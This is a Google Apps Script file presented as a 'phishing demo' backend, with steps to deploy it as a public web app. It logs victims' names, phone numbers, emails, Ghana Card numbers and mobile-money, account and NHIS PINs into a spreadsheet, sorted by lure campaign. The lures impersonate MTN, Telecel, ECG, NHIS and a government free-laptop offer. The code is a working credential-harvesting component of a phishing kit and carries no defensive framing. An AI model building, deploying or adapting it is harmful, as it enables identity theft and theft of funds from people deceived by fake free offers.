// ================================================================
//  FERN Phishing Demo — Google Apps Script Backend
//  Paste this into: script.google.com -> New Project
//  Then: Deploy -> New Deployment -> Web App
//  Set "Who has access" to "Anyone"
//  Copy the Web App URL and paste into js/config.js
// ================================================================

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var data = JSON.parse(e.postData.contents);

    // Build header row if sheet is empty
    if (sheet.getLastRow() === 0) {
      var headers = [
        "Timestamp", "Campaign", "Full Name", "Phone", "Email",
        "Ghana Card", "Password/PIN", "Extra Field 1", "Extra Field 2",
        "Extra Field 3", "Page URL"
      ];
      sheet.appendRow(headers);
      sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold")
           .setBackground("#1e293b").setFontColor("#ffffff");
      sheet.setFrozenRows(1);
    }

    // Map fields to columns
    var row = [
      data.timestamp     || new Date().toLocaleString(),
      data.campaign      || "Unknown",
      data.fullname      || "",
      data.phone         || "",
      data.email         || "",
      data.ghana_card    || "",
      data.momo_pin      || data.account_pin || data.nhis_pin || "",
      data.student_id    || data.meter_number || data.nhis_id || data.package || "",
      data.institution   || data.level       || data.region  || data.balance || "",
      data.network       || data.dob         || "",
      data.page          || ""
    ];

    sheet.appendRow(row);

    // Color-code by campaign
    var lastRow = sheet.getLastRow();
    var colors = {
      "MTN Free Data":          "#fff8e1",
      "Government Free Laptop": "#f0faf4",
      "Telecel Free Bundle":    "#f9f0ff",
      "ECG Bill Waiver":        "#f0f7ff",
      "NHIS Free Renewal":      "#f0faf4"
    };
    var bg = colors[data.campaign] || "#ffffff";
    sheet.getRange(lastRow, 1, 1, row.length).setBackground(bg);

    return ContentService
      .createTextOutput(JSON.stringify({status: "ok"}))
      .setMimeType(ContentService.MimeType.JSON);

  } catch(err) {
    return ContentService
      .createTextOutput(JSON.stringify({status: "error", message: err.toString()}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService
    .createTextOutput("FERN Demo Backend - POST only")
    .setMimeType(ContentService.MimeType.TEXT);
}
